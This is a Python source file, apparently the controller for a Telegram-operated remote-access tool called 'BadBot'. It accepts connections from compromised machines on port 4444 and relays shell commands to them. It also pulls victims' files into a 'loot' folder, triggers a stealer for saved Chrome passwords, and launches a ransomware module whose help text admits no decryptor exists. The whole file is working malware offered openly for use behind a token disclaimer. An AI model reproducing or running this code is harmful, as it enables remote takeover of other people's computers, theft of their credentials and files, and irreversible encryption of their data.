import socket
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, PicklePersistence
import config as c
import json
import pickle
import os
import sys
import threading
import urllib.request
from Mods import lib_pysome as pysome


host = "0.0.0.0"
port = 4444
id = 0
web_url = 'google.com'
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
server.bind((host, port))

server.listen(5)
server.settimeout(90)

class client():
    def __init__(self):
        self.start()

    def start(self):
            try:
                server.settimeout(90)
                self.sock, self.addr = server.accept()
                self.IP = self.addr[0]
                self.PORT = self.addr[1]
                self.request_id = 0
                self.timeout = 60
                dat = self.sock.recv(2048)
                dat = dat.decode()
                dat = json.loads(dat)
                print (dat)
                self.hostname = dat['HOST']
                self.location = dat['LOC']
                self.password = False
            except:
                print('error occured(Session Time out)')
                self.hostname = 'UNKNOWN'
                self.IP = 'Timed Out'
                self.port = 'CLOSED'

    def receive(self):
        data = self.sock.recv(10240)
        data = json.loads(data)
        try:         
            print (type(data['DATA']))
            return data['DATA']
        except Exception as e:
            print("recv exception")
            print(str(e))

    def Cpass(self):
        data = {'IP':self.IP, 'PORT':self.PORT, 'RID':self.request(), 'DATA':'CPASS', 'TIMEOUT':self.timeout, 'LOC':self.location}        
        self.sock.settimeout(self.timeout)
        data = json.dumps(data)
        self.sock.send(data.encode())
        size = self.sock.recv(1024)
        size = json.loads(size.decode())
        print(size)
        self.sock.send("start".encode())
        d = b''
        p = b''
        try:
            while not(len(p) == size):
                d = self.sock.recv(4096)
                p += d
                len(p)
        ###########
            with open('sample.txt', 'wb') as f:
                f.write(p)
                f.close()
            return pickle.loads(p)
            
        except Exception as e:
            print (str(e))
            return "error occured"
        
    
    def request(self):
        self.request_id += 1
        return self.request_id 

    def send_command(self, command):        
        data = {'IP':self.IP, 'PORT':self.PORT, 'RID':self.request(), 'DATA':command, 'TIMEOUT':self.timeout, 'LOC':self.location}        
        self.sock.settimeout(self.timeout)
        data = json.dumps(data)
        try:
            self.sock.send(data.encode())
            out = self.receive()
            return out
        except Exception as e:
            print (str(e))
            return "error occured"
            
    
    def download(self, file_name):
        print("downloading")
        data = {'IP':self.IP, 'PORT':self.PORT, 'RID':self.request(), 'DATA':'DOWNLOAD', 'TIMEOUT':self.timeout, 'LOC':self.location, 'FILE':file_name}

        data = json.dumps(data)
        self.sock.send(data.encode())
        size = self.sock.recv(1024)
        size = json.loads(size.decode())
        print(size)
        self.sock.send("start".encode())
        d = b''
        p = b''
        try:
            while not(len(p) == size):
                d = self.sock.recv(4096)
                p += d
                len(p)

            with open('loot/{0}__{1}'.format(self.hostname, file_name), 'wb') as f:
                f.write(p)
                f.close()
            print("done")
            return 'loot/{0}__{1}'.format(self.hostname, file_name)
        except Exception as e:
            print (str(e))
    
    def ransomware(self):
        self.__ransomware = pysome.ransomware()
        self.key = self.__ransomware.key_gen(passwd=self.password)
        self.salt = self.__ransomware.salt
        self.path = False
        self.keyfile = 'loot/{}_{}.key'.format(self.IP, self.hostname)
        self.save_keys()

    def save_keys(self):
        self.__ransomware.save_key(self.keyfile)

    def pysome_send_keys(self):
        data = {'DATA':'Ecrypt'}        
        self.sock.settimeout(self.timeout)
        data = json.dumps(data)
        #initiating ransomware
        self.sock.send(data.encode())
        #sending required files
        self.sock.recv(1024)
        self.sock.send(self.key)
        
        return "Attack Initiated! \n Client will be under load so be careful"

    def get_keys(self, keyfile):
        self.keyfile = keyfile
        try:
            with open(self.keyfile, 'rb') as file:
                data = file.read()
                file.close()
            data = pickle.loads(data)
            self.password = data['password']
            self.key = data['key']
            
        except Exception as e:
            print('error in get_keys: %s ' % str(e))

CL_LIST = []

def add_client():
    global CL_LIST
    CL_LIST.append(client())


#shell Commanding Goes here.................
def terminal():
    while True:
        inp = input('shell: >')
        out = CL_LIST[0].send_command(inp)
        print(out)

def shell(text, id):
    global CL_LIST
    print(text)
    out = CL_LIST[id].send_command(text)
    return out

def scan(req, target):
    url = "https://api.hackertarget.com/{0}?q={1}".format(req, target)
    try:
        response = urllib.request.urlopen(url)
        data = (response.read()).decode()
        return data
    except Exception as e:
        print(str(e))
        return str(e)

#telegram bot Interface here

updater = Updater(token=c.api, use_context=True)
dispather = updater.dispatcher
def start(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text=".....Welcome To BadBot testing......")
    context.bot.send_message(chat_id=update.effective_chat.id, text="....I am Very BadBot....")
    
def commanding(update, context):
    global id
    txt = update.message.text
    print(txt)
    out = shell(txt, id)
    context.bot.send_message(chat_id=update.effective_chat.id, text=out)
    
def get_client(update, context):
    global CL_LIST
    txt = []
    txt.append("{0}. {1} :   {2}    {3}".format("ID","ADRESS", "PORT", "HOSTNAME"))
    for C in range(len(CL_LIST)):
        txt.append("{0}. {1} :   {2}    {3}".format(C, CL_LIST[C].IP, CL_LIST[C].PORT, CL_LIST[C].hostname))
    
    cl_txt = '\n'.join(txt)
    context.bot.send_message(chat_id=update.effective_chat.id, text=cl_txt)

def listen(update, context):
    global CL_LIST
    context.bot.send_message(chat_id=update.effective_chat.id, text="waiting for clients......")
    add_client()
    
    try:  
        txt = "{0} :   {1}    {2}".format(CL_LIST[-1].IP, CL_LIST[-1].PORT, CL_LIST[-1].hostname)
        print (txt)
        context.bot.send_message(chat_id=update.effective_chat.id, text=txt)
        print ("done")
    except Exception as e:
        print (str(e))

def select_target(update, context):
    global id
    id = int(context.args[0])
    print (type(id))
    print (id)
    context.bot.send_message(chat_id = update.effective_chat.id, text="selected Target: {0}".format(id))

def image_download(update, context):
    global id
    file_name = ''.join(context.args)
    context.bot.send_message(chat_id = update.effective_chat.id, text="Downloading File to server....")
    try:
        loot = CL_LIST[id].download(file_name)
        print (loot)
        context.bot.send_message(chat_id=update.effective_chat.id, text="Fetching Image...")
        context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(loot, 'rb'))
    except Exception as e:
        print (e)
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))


def Doc_download(update, context):
    global id
    file_name = ' '.join(context.args)
    print (file_name)
    context.bot.send_message(chat_id = update.effective_chat.id, text="Downloading File to server....")
    try:
        loot = CL_LIST[id].download(file_name)
        print (loot)
        context.bot.send_message(chat_id=update.effective_chat.id, text="Fetching doucument...")
        context.bot.send_document(chat_id=update.effective_chat.id, document=open(loot, 'rb'))
    except Exception as e:
        print (e)
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))

def chrome_pass(update, context):
    global id 
    context.bot.send_message(chat_id=update.effective_chat.id, text="Starting password Stealer")
    context.bot.send_message(chat_id=update.effective_chat.id, text="wait for response for 60 seconds")
    out = CL_LIST[id].Cpass()
    txt = ["Passwords and user name Found: \n"]
    try:
        with open('loot/chrome_passowrds.json', 'w') as f:
            f.write(json.dumps(out, indent=2))
            f.close()
        couter = 0
        for i in range(len(out)):
            if out[i]['USER'] == '' and out[i]['PASS'] == '':
                continue
            else:
                couter += 1               
                txt.append("{2}.\n username: {0} \n password: {1} \n".format(out[i]['USER'],out[i]['PASS'], couter))
        
        txt = '\n'.join(txt)

        # context.bot.send_message(chat_id=update.effective_chat.id, text=txt)
        context.bot.send_message(chat_id=update.effective_chat.id, text="database text file") 
        context.bot.send_document(chat_id=update.effective_chat.id, document=open('loot/chrome_passowrds.json', 'rb'))
        
    except Exception as e:
        print (e)

def loots_list(update, context):
    txt = os.listdir('loot/')
    txt = '\n'.join(txt)
    context.bot.send_message(chat_id=update.effective_chat.id, text=txt)

def get_loot(update, context):
    try:
        file_name = ' '.join(context.args)
        path = os.path.join('loot/', file_name)
        context.bot.send_document(chat_id=update.effective_chat.id, document=open(path, 'rb'))
    except Exception as e:
        print (str(e))
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))

def set_web_target(update, context):
    global web_url
    web_url = ''.join(context.args)
    context.bot.send_message(chat_id=update.effective_chat.id, text='url set : %s' % web_url)

def get_web_target(update, context):
    global web_url
    context.bot.send_message(chat_id=update.effective_chat.id, text=web_url)

def s_dns_lookup (update, context):
    global web_url
    result = scan('dnslookup/', web_url)
    context.bot.send_message(chat_id=update.effective_chat.id, text=result)

def s_traceroute (update, context):
    global web_url
    result = scan('mtr/', web_url)
    context.bot.send_message(chat_id=update.effective_chat.id, text=result)

def s_nping (update, context):
    global web_url
    result = scan('nping/', web_url)
    context.bot.send_message(chat_id=update.effective_chat.id, text=result)

def s_whois (update, context):
    global web_url
    result = scan('whois/', web_url)
    context.bot.send_message(chat_id=update.effective_chat.id, text=result)

def s_pagelinks (update, context):
    global web_url
    result = scan('pagelinks/', web_url)
    context.bot.send_message(chat_id=update.effective_chat.id, text=result)

def s_zonetransfer (update, context):
    global web_url
    result = scan('zonetransfer/', web_url)
    context.bot.send_message(chat_id=update.effective_chat.id, text=result)

def start_encrypt(update, context):
    out = CL_LIST[id].pysome_send_keys()
    context.bot.send_message(chat_id=update.effective_chat.id, text=out)

def pysome_set_passwd(update, context):
    try:
        passwd = context.args[0]
        CL_LIST[id].password = passwd.encode()
        CL_LIST[id].ransomware()
        txt = "passwd: {} \n salt: {} \n key: {} ".format(str(CL_LIST[id].password), str(CL_LIST[id].salt), str(CL_LIST[id].key))    
        context.bot.send_message(chat_id=update.effective_chat.id, text=txt)

    except Exception as e:
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))

def pysome_get_key(update, context):
    try:
        print(str(CL_LIST[id].key))
        txt = "passwd: {} \n salt: {} \n key: {} ".format(str(CL_LIST[id].password), str(CL_LIST[id].salt), str(CL_LIST[id].key))    
        context.bot.send_message(chat_id=update.effective_chat.id, text=txt)
    except Exception as e :
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))
        context.bot.send_message(chat_id=update.effective_chat.id, text='generate new keys')

def pysome_load_keys(update, context):
    pass

def pysome_gen_keys(update, context):
    try:
        CL_LIST[id].ransomware()
        txt = "passwd: {} \n salt: {} \n key: {} ".format(str(CL_LIST[id].password), str(CL_LIST[id].salt), str(CL_LIST[id].key))    
        context.bot.send_message(chat_id=update.effective_chat.id, text=txt)
    except Exception as e :
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))


def _help(update, context):
    txt = '''
    ------- welcome to BadBot ----------
      --- A Project by Aman Singh ---

DONOT USE THIS PROJECT FOR ANY UNETHICAL ACTIVITY....
BUT FEEL FREE TO EDIT AND DEVELOP THIS PROJECT AS YOUR OWN
/help - view this menu

MAIN COMMANDS :-
/start - say hello to BadBot
/listen - start listening for targets(blocking message)
/client - list all the available targets
/select - select a target eg.(/select 1)
/rst - restart bot server 

you can directly send shell commands as messages

POST EXPLOIT COMMANDS :-
/image - download and view an image eg.(/image file.jpg)
/download - document download eg.(/download file.doc)
/cpass - extract saved chrome passwords
/loot - check all your loots
/lootera - download a loot file eg.(/loot filename.ext)

WEB APP RECON :-
/seturl - set a target website
/geturl - check current target website
/tracert - trace route
/dnslookup - find dns record for a domain
/nping - test connectivity to a host
/whois - determine registered owner
/pagelinks - dump all links from the webpage
/zonetransfer - test for zone transfer 

RANSOMWARE MODULE COMMANDS :-
/set_password - assign password for your encryptor
/get_keys - retrieve password salt and key
/keygen - generate keys (if no password then random key)
/encrypt - start encrypting files

!!!!WARNING BEFORE USE RANSOMWARE!!!!
This module will encrypt all your files 
Decrypting module is not available (in development)
keys are saved in loot directory with corresponding ip and hostname
If anything goes wrong then developer of this project is not resposible..

    '''
    context.bot.send_message(chat_id=update.effective_chat.id, text=txt)

def stop_and_restart():
        """Gracefully stop the Updater and replace the current process with a new one"""
        updater.stop()
        os.execl(sys.executable, sys.executable, *sys.argv)

def restart(update, context):
    update.message.reply_text('Bot is restarting...')
    threading.Thread(target=stop_and_restart).start()

#all handlers goes here

dispather.add_handler(CommandHandler('help', _help))
dispather.add_handler(CommandHandler('lootera', get_loot))
dispather.add_handler(CommandHandler('loot', loots_list))
dispather.add_handler(CommandHandler('cpass', chrome_pass))
dispather.add_handler(CommandHandler('image', image_download))
dispather.add_handler(CommandHandler('download', Doc_download))
dispather.add_handler(CommandHandler('select', select_target))
dispather.add_handler(CommandHandler('start', start))
dispather.add_handler(CommandHandler('listen', listen))
dispather.add_handler(CommandHandler('client', get_client))
dispather.add_handler(CommandHandler('rst', restart))
dispather.add_handler(CommandHandler('seturl', set_web_target))
dispather.add_handler(CommandHandler('geturl', get_web_target))
dispather.add_handler(CommandHandler('tracert', s_traceroute))
dispather.add_handler(CommandHandler('dnslookup', s_dns_lookup))
dispather.add_handler(CommandHandler('nping', s_nping))
dispather.add_handler(CommandHandler('whois', s_whois))
dispather.add_handler(CommandHandler('pagelinks', s_pagelinks))
dispather.add_handler(CommandHandler('zonetransfer', s_zonetransfer))
dispather.add_handler(CommandHandler('set_password', pysome_set_passwd))
dispather.add_handler(CommandHandler('get_keys', pysome_get_key))
dispather.add_handler(CommandHandler('encrypt', start_encrypt))
dispather.add_handler(CommandHandler('keygen', pysome_gen_keys))
dispather.add_handler(MessageHandler(Filters.text, commanding))
def main ():
    print("starting Bot....")    
    updater.start_polling()
    print ("bot started.......")
    updater.idle()
    #terminal()


if __name__ == "__main__":
    main()